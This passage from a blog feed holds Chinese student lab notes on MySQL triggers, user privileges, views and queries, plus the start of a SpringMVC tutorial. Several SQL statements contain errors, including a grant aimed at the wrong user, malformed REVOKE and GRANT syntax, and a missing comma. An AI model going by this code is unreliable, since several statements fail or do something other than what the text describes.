        <content type="html"><![CDATA[<h4 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h4><ol><li><p>熟悉通过SQL对数据进行完整性控制；</p></li><li><p>练习实际应用中完整性控制方法；</p></li><li><p>练习触发器的创建和使用。</p></li></ol><h4 id="二、实验内容-："><a href="#二、实验内容-：" class="headerlink" title="二、实验内容 ："></a>二、实验内容 ：</h4><p>基于某员工管理数据库，使用触发器实现数据完整性控制，完成以下功能：</p><ol><li><p>创建触发器实现员工入职时，记录员工初始部门和工资信息到变动历史表中；</p></li><li><p>创建触发器实现员工信息变更时，记录员工的部门或工资变动情况到变动历史表中；</p></li><li><p>创建触发器实现员工离职时，自动备份离职前的工资到变动历史表中。</p></li></ol><h4 id="三、题目："><a href="#三、题目：" class="headerlink" title="三、题目："></a>三、题目：</h4><p>某员工信息管理系统中，当员工入职、离职、调动部门或工资变动时，需将变动信息记入变动历史中，请使用触发器完成此功能。变动历史包含部门变动历史和工资变动历史，分别使用部门变动历史表和工资变动历史表记录对应信息。</p><p>参考表结构如下：</p><ol><li><p>员工表：employee(eid,ename,dept,salary,uptime,stutus)<br>其中eid为员工编号，ename为员工姓名，dept为所在部门，salary为工资，uptime为修改时间，stutus为状态（1表示在职，0表示离职）。</p></li><li><p>部门变动历史表：dept_history(dhid, eid, old, new, uptime)<br>其中dhid为部门变动编号（自动增长，无需赋值），eid为员工编号，old为调动前的部门（新入职的员工old值记为NULL），new为调动后的部门，uptime为修改时间。</p></li><li><p>工资变动历史表：sal_history(shid, eid, old, new, uptime)<br>其中shid为工资变动编号（自动增长，无需赋值），eid为员工编号，old为变动前的工资，new为变动后的工资，uptime为修改时间。</p></li></ol><p>触发器要求如下：</p><ol><li><p>当新职工入职时，员工信息表将插入1条数据。同时，触发器在部门变动历史中增加1条记录，其中old值为null；在工资变动历史中增加1条记录，其中old值为0。</p></li><li><p>当新职工部门或工资发生变化时，触发器执行以下操作。若部门发生变动，则在变动历史中增加1条记录；若工资发生变动，则在工资变动历史中增加1条记录。</p></li></ol><h4 id="四、实验过程："><a href="#四、实验过程：" class="headerlink" title="四、实验过程："></a>四、实验过程：</h4><p>创建数据库：</p><pre><code class="sql">CREATE DATABASE emp;-- 创建员工表CREATE TABLE employee (eid CHAR (6) PRIMARY KEY,ename VARCHAR (10) UNIQUE,dept VARCHAR (10) UNIQUE,salary INT,uptime datetime,status char(1)) --插入数据INSERT INTO employee VALUES( &#39;1001&#39;, &#39;zs&#39;, &#39;软开&#39;, 3000, CURRENT_TIMESTAMP, &#39;1&#39; );-- 创建部门变动历史表CREATE TABLE dept_history (    dhid INT PRIMARY KEY AUTO_INCREMENT,    eid CHAR (6),    old VARCHAR (10),    new VARCHAR (10),    uptime datetime ) -- 创建工资变动历史表CREATE TABLE sal_history ( shid INT PRIMARY KEY AUTO_INCREMENT, eid CHAR (6), old INT, new INT, uptime datetime )</code></pre><p>问题一：当新职工入职时，员工信息表将插入1条数据。同时，触发器在部门变动历史中增加1条记录，其中olddept值为null；在工资变动历史中增加1条记录，其中oldsal值为0。</p><p>创建insert触发器：</p><pre><code class="sql">DELIMITER $CREATE TRIGGER emp_insertAFTER INSERT ON employeeFOR EACH ROWBEGININSERT INTO dept_history ( eid, old, new, uptime )    VALUES( new.eid, NULL, new.dept, new.uptime );    INSERT INTO sal_history ( eid, old, new, uptime )    VALUES( new.eid, 0, new.salary, new.uptime );END$DELIMITER ;</code></pre><p>问题二：当新职工部门或工资发生变化时，触发器执行以下操作。若部门发生变动，则在变动历史中增加1条记录；若工资发生变动，则在工资变动历史中增加1条记录。</p><p>创建update触发器：</p><pre><code class="sql">DELIMITER $CREATE TRIGGER emp_updateAFTER UPDATE ON employeeFOR EACH ROWBEGIN     IF    (old.dept != new.dept) THEN    INSERT INTO dept_history ( eid, old, new, uptime )    VALUES(new.eid, old.dept, new.dept, new.uptime );    END IF;    IF    (old.salary != new.salary) THEN    INSERT INTO sal_history ( eid, old, new, uptime )    VALUES(new.eid, old.salary, new.salary, new.uptime );        END IF;END$DELIMITER ;</code></pre><h4 id="五、实验小结："><a href="#五、实验小结：" class="headerlink" title="五、实验小结："></a>五、实验小结：</h4><p>触发器触发时间分为 before和 after，顾名思义，before代表触发器里面的命令在修改数据之前执行，after代表触发器里面的命令在修改数据命令之后执行。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统（三）——数据库安全性控制</title>
      <link href="2021/01/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%80%A7%E6%8E%A7%E5%88%B6/"/>
      <url>2021/01/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%80%A7%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h4><ol><li><p>理解自主存取控制和视图机制在数据库安全性中的应用；</p></li><li><p>熟练掌握用户管理、授予权限、收回权限的SQL语句，并验证其有效性；</p></li><li><p>理解角色的作用，能够区分角色和用户。</p></li></ol><h4 id="二、实验内容："><a href="#二、实验内容：" class="headerlink" title="二、实验内容："></a>二、实验内容：</h4><p>针对不同用户对学生选课数据库的不同权限要求，完成以下实验内容。</p><ol><li><p>创建用户。掌握创建用户的语法结构，根据题目要求运用相关SQL语句创建必要的用户。</p></li><li><p>创建视图。根据题目要求，创建针对特定数据的视图。</p></li><li><p>权限授予和收回。理解和掌握GRANT和REVOKE语法结构的各个组成成分，结合用户和角色管理，分别设计不同的存取权限语句，并调试成功。</p></li><li><p>结合应用需求，理解角色的作用和角色管理的相关操作。</p></li></ol><h4 id="三、实验过程："><a href="#三、实验过程：" class="headerlink" title="三、实验过程："></a>三、实验过程：</h4><h5 id="1、题目要求："><a href="#1、题目要求：" class="headerlink" title="1、题目要求："></a>1、题目要求：</h5><p>1．数据库：学生选课数据库<br>2．数据表：学生表 student、课程表 course、选课表 SC<br>3．用户：admin、stu、teacher、<br>4．权限要求：<img src="https://img-blog.csdnimg.cn/20210102135458170.png" alt="在这里插入图片描述"><br>说明：<br>（1）admin 用户拥有对数据库的所有操作权限，且能够为其他用户授予权限。<br>（2）teacher 用户在 student 表上只能查看 Sno、Sname、Ssex 和 Sdept 字段。<br>（2）学生不能更新 Sno 和院系字段。<br>（3）teacher 在 SC 表上只能更新 grade 字段。</p><h5 id="2、在学生选课数据库的基础上，按以下要求完成权限设置。"><a href="#2、在学生选课数据库的基础上，按以下要求完成权限设置。" class="headerlink" title="2、在学生选课数据库的基础上，按以下要求完成权限设置。"></a>2、在学生选课数据库的基础上，按以下要求完成权限设置。</h5><p>1、使用 root 账号登录，创建用户 stu、teacher 和 amdin，密码为123：</p><pre><code class="sql">create user &#39;stu&#39;@&#39;localhost&#39; identified by &#39;123&#39;;create user &#39;teacher&#39;@&#39;localhost&#39; identified by &#39;123&#39;;create user &#39;admin&#39;@&#39;localhost&#39; identified by &#39;123&#39; with grant option;</code></pre><p>新创建的用户可登录mysql，但无权限查看stu_course数据库。</p><p>2、根据表格要求及说明为用户设置相应的权限，并在设置完成后，测试设置的有效性。</p><p>①设置 admin 的权限:</p><pre><code class="sql">grant all privilegeson student,course,SC to &#39;u1&#39;@&#39;localhost&#39;with grant option</code></pre><p>②设置 stu 的权限:</p><pre><code class="sql">grant select on student,course,SC to&#39;stu&#39;@&#39;localhost&#39;;grant update on student to&#39;stu&#39;@&#39;localhost&#39;;grant inserton SC to&#39;stu&#39;@&#39;localhost&#39;;</code></pre><p>③设置 teacher 的权限:</p><pre><code class="sql">grant select on student,course,SC to &#39;teacher&#39;@&#39;localhost&#39;;grant update on SC(grade) to &#39;teacher&#39;@&#39;localhost&#39;;</code></pre><p>3、创建用户 u1 和 u2，通过 admin 用户为 u1 授予 student 表上的 insert 权限，并允许 u1为其他用户授予该权限。</p><pre><code class="sql">create user &#39;u1&#39;@&#39;localhost&#39; identified by &#39;123&#39;;create user &#39;u2&#39;@&#39;localhost&#39; identified by &#39;123&#39;;</code></pre><pre><code class="sql">grant inserton student to &#39;u1&#39;@&#39;localhost&#39;;with grant option</code></pre><p>4、通过 u1 用户为 u2 用户授予 student 表上的 insert 权限。</p><pre><code class="sql">grant inserton student to &#39;u2&#39;@&#39;localhost&#39;;</code></pre><p>5、收回 u1 在 student 表上的 insert 权限，验证 u1 和 u2 的权限变化。</p><pre><code class="sql">revoke insert on student to &#39;u1&#39;@&#39;localhost&#39;;</code></pre><p>默认会级联收回权限。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统（二）——数据更新和视图</title>
      <link href="2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E6%9B%B4%E6%96%B0%E5%92%8C%E8%A7%86%E5%9B%BE/"/>
      <url>2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E6%9B%B4%E6%96%B0%E5%92%8C%E8%A7%86%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h4 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h4><ol><li><p>熟练掌握增加、删除、修改数据的SQL语句，结合嵌套SQL子查询，分别设计几种不同形式的插入、修改和删除数据的语句，并调试成功；</p></li><li><p>理解视图实现数据库安全性控制；</p></li><li><p>理解视图消解，能够进行视图的创建和查询。</p><h4 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容 :"></a>二、实验内容 :</h4></li><li><p>使用学生选课数据库，实现单元组插入、批量数据插入、修改数据和删除数据等SQL语句；</p></li><li><p>根据应用需求，创建基本视图和带WITH CHECK OPTION的视图，并验证视图WITH CHECK OPTION选项的有效性。</p></li></ol><h4 id="三、实验过程："><a href="#三、实验过程：" class="headerlink" title="三、实验过程："></a>三、实验过程：</h4><h5 id="1、数据的增删改："><a href="#1、数据的增删改：" class="headerlink" title="1、数据的增删改："></a>1、数据的增删改：</h5><p>添加一个学生：</p><pre><code class="sql">insert into Student(Sno,Sname,Ssex,Sdept,Sage) values(&#39;201215128&#39;,&#39;TheShy&#39;,&#39;男&#39;,&#39;IS&#39;,18);</code></pre><p>将学生 201215121 的年龄改为 22 岁：</p><pre><code class="sql">update student set Sage=22 where Sno=&#39;201215121&#39;;</code></pre><p>将所有学生的年龄增加一岁：</p><pre><code class="sql">update student set Sage = Sage+1;</code></pre><p>删除学号为 201215128的学生记录：</p><pre><code class="sql">delete from Student where Sno=&#39;201215128&#39;;</code></pre><h5 id="2、视图："><a href="#2、视图：" class="headerlink" title="2、视图："></a>2、视图：</h5><p>创建信息系学生的视图：</p><pre><code class="sql">create view IS_Student as select Sno,Sname,Sage from Student where Sdept=&#39;IS&#39;;</code></pre><p>建立信息系学生的视图，并要求进行修改和插入操作时仍需保留该视图只有信息系的学生：</p><pre><code class="sql">create view IS_Student as select Sno,Sname,Sage from Student where Sdept=&#39;IS&#39; with check option;</code></pre><p>定义视图时加上 with check option 以后对该视图进行插入，删除，修改删除时，会自动加上条件 <code>Sdept=&#39;IS&#39;</code> 的条件。</p><h4 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h4><ul><li><p>视图是一个虚表，只是为用户提供了一个观察底层数据的窗口，通过视图看到的数据会随关系表的变化而改变。</p></li><li><p>用户可像操作关系表一样操作视图，但操作能否成功，还要看对视图的操作能否由DBMS转化为对相应基表的操作。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统（一）——数据查询</title>
      <link href="2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2/"/>
      <url>2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h4><ol><li><p>熟练掌握SQL定义数据表和索引的方法；</p></li><li><p>能够使用SQL完成数据的单表查询、多表查询和嵌套查询操作。</p></li></ol><h4 id="二、实验内容："><a href="#二、实验内容：" class="headerlink" title="二、实验内容："></a>二、实验内容：</h4><ol><li><p>根据指定场景创建数据库；</p></li><li><p>根据具体的查询应用需求写出相应的SQL查询语句，并得到正确的查询结果。<br>1、熟悉基于单表的SQL的数据查询功能；<br>2、掌握基于单表的GROUP BY子句、HAVING子句、ORDER BY子句的用法；<br>3、掌握基于单表的（NOT）IN等谓词的用法，掌握集合函数的用法；<br>4、掌握多表连接查询的适用情况和语句构造方法；</p></li></ol><h4 id="三、实验过程："><a href="#三、实验过程：" class="headerlink" title="三、实验过程："></a>三、实验过程：</h4><h5 id="1、创建学生课程数据库-（stu-course）："><a href="#1、创建学生课程数据库-（stu-course）：" class="headerlink" title="1、创建学生课程数据库 （stu_course）："></a>1、创建学生课程数据库 （stu_course）：</h5><pre><code class="sql">create database stu_course; </code></pre><h5 id="2、学生表、课程表和学生选课表的创建和修改："><a href="#2、学生表、课程表和学生选课表的创建和修改：" class="headerlink" title="2、学生表、课程表和学生选课表的创建和修改："></a>2、学生表、课程表和学生选课表的创建和修改：</h5><h6 id="2-1、创建数据表："><a href="#2-1、创建数据表：" class="headerlink" title="2.1、创建数据表："></a>2.1、创建数据表：</h6><pre><code class="sql">create table Student(      Sno char(9)primary key,      Sname char(20)unique,      Ssex char(2),    Sage smallint,    Sdept char(20)    );create table Course (    Cno char(4)primary key,    Cname char(4) not null,      Cpno char(4),    Ccredit smallint ,     foreign key(Cpno) references Course(Cno) );create table SC(    Sno char(9),    Cno char(4),    Grade smallint,    primary key(Sno,Cno),    foreign key(Sno) references Student(Sno),    foreign key(Cno) references Course(Cno));</code></pre><h6 id="2-2、修改数据表："><a href="#2-2、修改数据表：" class="headerlink" title="2.2、修改数据表："></a>2.2、修改数据表：</h6><p>在 Student 表增加入学时间列，数据类型为日期型：</p><pre><code class="sql">alter table Student add S_entrance Date;</code></pre><p>将年龄的数据类型 由 字符型（假设原来是字符型）改为 整数型：</p><pre><code class="sql">alter table Student alter column Sage int;</code></pre><p>增加课程名称必须取唯一的约束条件：</p><pre><code class="sql">alter table Course add unique(Cname);</code></pre><p>删除 Student表：</p><pre><code class="sql">drop  table Student;</code></pre><h5 id="3、插入数据："><a href="#3、插入数据：" class="headerlink" title="3、插入数据："></a>3、插入数据：</h5><pre><code class="sql">INSERT INTO student VALUES (&#39;201215121&#39;, &#39;李勇&#39;, &#39;男&#39;, 20, &#39;CS&#39;);INSERT INTO student VALUES (&#39;201215122&#39;, &#39;刘晨&#39;, &#39;女&#39;, 19, &#39;CS&#39;);INSERT INTO student VALUES (&#39;201215123&#39;, &#39;王敏&#39;, &#39;女&#39;, 18, &#39;MA&#39;);INSERT INTO student VALUES (&#39;201215125&#39;, &#39;张立&#39;, &#39;男&#39;, 19, &#39;IS&#39;);INSERT INTO course VALUES (&#39;1&#39;, &#39;数据库&#39;, &#39;5&#39;, 4);INSERT INTO course VALUES (&#39;2&#39;, &#39;数学&#39;, NULL, 2);INSERT INTO course VALUES (&#39;3&#39;, &#39;信息系统&#39;, &#39;1&#39;, 4);INSERT INTO course VALUES (&#39;4&#39;, &#39;操作系统&#39;, &#39;6&#39;, 3);INSERT INTO course VALUES (&#39;5&#39;, &#39;数据结构&#39;, &#39;7&#39;, 4);INSERT INTO course VALUES (&#39;6&#39;, &#39;数据处理&#39;, NULL, 2);INSERT INTO course VALUES (&#39;7&#39;, &#39;PASCAL语言&#39;, &#39;6&#39;, 4);INSERT INTO sc VALUES (&#39;201215121&#39;, &#39;1&#39;, 92);INSERT INTO sc VALUES (&#39;201215121&#39;, &#39;2&#39;, 85);INSERT INTO sc VALUES (&#39;201215121&#39;, &#39;3&#39;, 88);INSERT INTO sc VALUES (&#39;201215122&#39;, &#39;2&#39;, 90);INSERT INTO sc VALUES (&#39;201215122&#39;, &#39;3&#39;, 80);</code></pre><h5 id="4、各种类型的查询操作："><a href="#4、各种类型的查询操作：" class="headerlink" title="4、各种类型的查询操作："></a>4、各种类型的查询操作：</h5><h6 id="4-1-、单表查询操作："><a href="#4-1-、单表查询操作：" class="headerlink" title="4.1 、单表查询操作："></a>4.1 、单表查询操作：</h6><p><strong>1、查询指定列</strong>：</p><p>查询所有学生的的学号与姓名：</p><pre><code class="sql">select Sno,Sname from Student;</code></pre><p><strong>2、查询全部列</strong>：</p><p>查询所有学生的信息：</p><pre><code class="sql">select * from Student;</code></pre><p><strong>3、查询经过计算的值</strong>：</p><p>查询全体学生的姓名和出生年份：</p><pre><code class="sql">select Sname 2021-Sage from Student;</code></pre><p><img src="https://img-blog.csdnimg.cn/20210101173925206.png" alt="在这里插入图片描述"><br><strong>4、消除出重复的元组</strong>：</p><pre><code class="sql">select Distinct Sno from Student; </code></pre><p><strong>5、查询满足条件的元组</strong>：</p><p>查询计算机科学系的所有学生：</p><pre><code class="sql">select Sname from Student where sdept=&#39;CS&#39;;</code></pre><p>查询年龄小于20的学生：</p><pre><code class="sql">select * from student where Sage &lt;20;</code></pre><p>查询年龄在20~23岁之间的学生姓名，系别和年龄：</p><pre><code class="sql">select sname,sdept,sage from student where sage between 20 and 23; </code></pre><p>查询年龄不在20~23岁之间的学生姓名，系别和年龄：</p><pre><code class="sql">select sname,sdept,sage from student where sage not between 20 and 23; </code></pre><p><strong>6、确定集合（IN）</strong>：</p><p>查询 计算机科学系（CS），数学系（MA）和信息系（IS）学生的姓名和性别。</p><pre><code class="sql">select Sname,Ssex from student where Sdept in(&#39;CS&#39;,&#39;MA&#39;,&#39;IS&#39;); </code></pre><p>查询不是计算机科学系（CS），数学系（MA）和信息系（IS）学生的姓名和性别。</p><pre><code class="sql">select Sname,Ssex from student where Sdept not in(&#39;CS&#39;,&#39;MA&#39;,&#39;IS&#39;); </code></pre><p><strong>7、字符匹配（模糊查询）</strong>：</p><pre><code class="sql">like ：字符串匹配% :代表任意长度字符_ :代表单个字符</code></pre><p>查询学号为 201215121 的学生的信息：</p><pre><code class="sql">select * from where Sno like &#39;201215121&#39;;</code></pre><p>查询所有姓刘的学生姓名，学号和性别：</p><pre><code class="sql">select Sname,Sno,Ssex from student where Sname like&#39;刘%&#39;</code></pre><p>查询不姓刘的学生姓名，学号和性别：</p><pre><code class="sql">select Sname,Sno,Ssex from student where Sname not like&#39;刘%&#39;</code></pre><p>查询名字中第二个字为 “阳”的学生的姓名，学号：</p><pre><code class="sql">select Sname,Sno from student where Sname like&#39;_阳%&#39;;</code></pre><p><strong>8、多重条件查询（and ，or）</strong>：</p><p>查询计算机系的年龄20岁以下的学生的学生姓名：</p><pre><code class="sql">select Sname from student where Sdept=&#39;CS&#39; and Sage &lt; &#39;20&#39;;</code></pre><p><strong>9、order by</strong>：</p><p>查询选了3号课程的学生的学号和成绩，按成绩的降序排列（默认升序）：</p><pre><code class="sql">select Sno,Grade from SC where Cno=&#39;3&#39; order by Grade DESC;</code></pre><p><strong>10、聚集函数</strong>：</p><pre><code class="sql">count(*)                     统计元组个数count([distinct|all] &lt;列名&gt;)  统计一列中值的个数Sum([distinct|all] &lt;列名&gt;)    求一列总和Max([distinct|all] &lt;列名&gt;)    求一列中的最大值Min([distinct|all] &lt;列名&gt;)    求一列中的最小值Avg([distinct|all] &lt;列名&gt;)    求一列的平均值</code></pre><p>查询学生总人数：</p><pre><code class="sql">select count(*) from student;</code></pre><p>查询选修了课程的总人数：</p><pre><code class="sql">select count(distinct Sno) from student;</code></pre><p>查询学生 201215012 选修课程的总分数：</p><pre><code class="sql">select sum(Ccredit) from SC,Course where Sno=&#39;201215121&#39; and SC.Cno = Course.Cno;</code></pre><p><strong>11、分组（group by）</strong>：</p><p>求各个课程号及相应的选课人数：</p><pre><code class="sql">select Cno,count(*) from SC group by Cno;</code></pre><p>如果分组后还要求按一定的条件对这些组进行筛选，可以使用 having指定筛选条件。</p><p>查询选修了一门以上课程的学生学号：</p><pre><code class="sql">select Sno from SC group by Sno having count(*)&gt;1;</code></pre><p><strong>注意：where 子句中是不能用聚集函数的！需要用 having 代替</strong></p><h6 id="4-2-、多表连接查询操作："><a href="#4-2-、多表连接查询操作：" class="headerlink" title="4.2 、多表连接查询操作："></a>4.2 、多表连接查询操作：</h6><p>一次从两个及以上的表 查数据称为连接查询。</p><p>查询每个学生及其选修课程的情况：</p><pre><code class="sql">select student.*,SC.* from student,SC where student.Sno=SC.Sno; </code></pre><p>查询选修2号课程且成绩在90分以上的所有学生的学号和姓名：</p><pre><code class="sql">select student.Sno,Sname from Student,SC where Student.Sno=SC.Sno and SC.Cno=&#39;2&#39; and SC.Grade&gt;90;</code></pre><h6 id="4-3-、嵌套查询操作："><a href="#4-3-、嵌套查询操作：" class="headerlink" title="4.3 、嵌套查询操作："></a>4.3 、嵌套查询操作：</h6><h4 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h4><ul><li><p>HAVING 是跟GROUP BY 连在一起用的，放在GROUP BY 后面，此时的作用相当于WHERE。</p></li><li><p>WHERE 后面的条件中不能有聚集函数，比如SUM(),AVG()等，而HAVING 可以</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVC框架学习</title>
      <link href="2020/11/03/Java%20EE%E2%80%94%E2%80%94SpringMVC%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/11/03/Java%20EE%E2%80%94%E2%80%94SpringMVC%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="一、SpringMVC的基本概念："><a href="#一、SpringMVC的基本概念：" class="headerlink" title="一、SpringMVC的基本概念："></a>一、SpringMVC的基本概念：</h4><h5 id="1、三层架构和MVC："><a href="#1、三层架构和MVC：" class="headerlink" title="1、三层架构和MVC："></a>1、三层架构和MVC：</h5><p><strong>1.1、三层架构</strong>：</p><p>开发Web程序一般都是基于两种形式，一种C/S架构程序，一种B/S架构程序。在 JavaEE 开发中，几乎全都是基于 B/S 架构的开发。在 B/S 架构中，系统标准的三层架构包括：<strong>表现层</strong>、<strong>业务层</strong>、<strong>持久层</strong>。</p><p>三层架构中，每一层各司其职，接下来我们就说说每层都负责哪些方面：</p><ul><li><p>表现层：<br>也就是我们常说的web层。它负责接收客户端请求，向客户端响应结果，通常客户端使用http协议请求web 层，web 需要接收 http 请求，完成 http 响应。表现层包括展示层和控制层：控制层负责接收请求，展示层负责结果的展示。表现层依赖业务层，接收到客户端请求一般会调用业务层进行业务处理，并将处理结果响应给客户端。表现层的设计一般都使用 MVC 模型。（MVC 是表现层的设计模型，和其他层没有关系）</p></li><li><p>业务层：<br>也就是我们常说的 service 层。它负责业务逻辑处理，和我们开发项目的需求息息相关。web 层依赖业务层，但是业务层不依赖 web 层。业务层在业务处理时可能会依赖持久层，如果要对数据持久化需要保证事务一致性。（也就是我们说的，事务应该放到业务层来控制）</p></li><li><p>持久层：<br>也就是我们是常说的 dao 层。负责数据持久化，包括数据层即数据库和数据访问层，数据库是对数据进行持久化的载体，数据访问层是业务层和持久层交互的接口，业务层需要通过数据访问层将数据持久化到数据库中。通俗的讲，持久层就是和数据库交互，对数据库表进行曾删改查的。</p></li></ul><p><strong>1.2、 MVC</strong>：</p><p>MVC 全名是 Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写，是一种用于设计创建 Web 应用程序 表现层的模式。MVC 中每个部分各司其职：</p><ul><li><p>Model（模型）：<br>通常指的就是我们的数据模型。JavaBean的类，用来进行数据封装。</p></li><li><p>View（视图）：<br>通常指的就是我们的 jsp 或者 html。作用一般就是展示数据的。</p></li><li><p>Controller（控制器）：<br>是应用程序中处理用户交互的部分。作用一般就是处理程序逻辑的。<br>举个例子：<br>我们要保存一个用户的信息，该用户信息中包含了姓名，性别，年龄等等。<br>这时候表单输入要求年龄必须是 1~100 之间的整数。姓名和性别不能为空。并且把数据填充到模型之中。此时除了 js 的校验之外，服务器端也应该有数据准确性的校验，那么校验就是控制器的该做的。<br>当校验失败后，由控制器负责把错误页面展示给使用者。<br>如果校验成功，也是控制器负责把数据填充到模型，并且调用业务层实现完整的业务需求。</p></li></ul><h5 id="2、SpringMVC的概述："><a href="#2、SpringMVC的概述：" class="headerlink" title="2、SpringMVC的概述："></a>2、SpringMVC的概述：</h5><p>SpringMVC 是一种基于 Java 的实现 MVC 设计模型的轻量级 Web 框架，是 Spring 框架为<strong>表现层</strong>提供的的后续产品，是目前最主流的 MVC框架之一。</p><p><strong>2.1、SpringMVC 的优势</strong>：</p><p>1、清晰的角色划分：</p><ol><li>前端控制器（DispatcherServlet）</li><li>请求到处理器映射（HandlerMapping）</li><li>处理器适配器（HandlerAdapter）</li><li> 视图解析器（ViewResolver）</li><li> 处理器或页面控制器（Controller）</li><li> 验证器（ Validator）</li><li>命令对象（Command 请求参数绑定到的对象就叫命令对象）</li><li>表单对象（Form Object 提供给表单展示和提交到的对象就叫表单对象）。</li></ol><p>2、分工明确，而且扩展点相当灵活，可以很容易扩展，虽然几乎不需要。</p><p>3、由于命令对象就是一个 POJO，无需继承框架特定 API，可以使用命令对象直接作为业务对象。</p><p>4、和 Spring 其他框架无缝集成，是其它 Web 框架所不具备的。</p><p>5、可适配，通过 HandlerAdapter 可以支持任意的类作为处理器。</p><p>6、可定制性，HandlerMapping、ViewResolver 等能够非常简单的定制。</p><p>7、功能强大的数据验证、格式化、绑定机制。</p><p>8、利用 Spring 提供的 Mock 对象能够非常简单的进行 Web 层单元测试。</p><p>9、本地化、主题的解析的支持，使我们更容易进行国际化和主题的切换。</p><p>10、强大的 JSP 标签库，使 JSP 编写更容易。</p><h5 id="3、SpringMVC在三层架构的位置："><a href="#3、SpringMVC在三层架构的位置：" class="headerlink" title="3、SpringMVC在三层架构的位置："></a>3、SpringMVC在三层架构的位置：</h5><p><img src="https://img-blog.csdnimg.cn/20200930171640705.png"></p><h4 id="二、SpringMVC-的入门："><a href="#二、SpringMVC-的入门：" class="headerlink" title="二、SpringMVC 的入门："></a>二、SpringMVC 的入门：</h4><p><strong>1、使用Maven创建web工程，引入开发的jar包</strong>:</p><p>需要用的坐标如下：</p><pre><code class="xml">     &lt;properties&gt;        &lt;!-- 版本锁定 --&gt;        &lt;spring.version&gt;5.0.2.RELEASE&lt;/spring.version&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;!-- 单元测试--&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.11&lt;/version&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;            &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-web&lt;/artifactId&gt;            &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;            &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;            &lt;version&gt;2.5&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;            &lt;artifactId&gt;jsp-api&lt;/artifactId&gt;            &lt;version&gt;2.0&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p><strong>2、配置核心的控制器（配置DispatcherServlet）</strong>：</p><p>在web.xml配置文件中核心控制器DispatcherServlet</p><pre><code class="xml">&lt;!-- SpringMVC的核心控制器 --&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;        